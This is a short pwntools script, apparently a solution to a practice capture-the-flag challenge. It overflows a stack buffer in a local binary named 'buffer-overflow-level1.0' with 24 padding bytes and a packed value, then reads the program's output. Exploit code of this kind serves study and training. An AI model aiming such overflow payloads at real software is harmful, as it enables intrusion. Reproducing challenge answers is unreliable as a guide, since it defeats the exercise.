from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

payload = b'QWERTYUIOPqwertyuiopQWER' + p64(0xdeadbeef) + b'\n' # 24 bytes in stack

print(payload)

io = process('/challenge/buffer-overflow-level1.0')

io.sendafter("Give me your input\n", payload)

while True:
    io.recvline()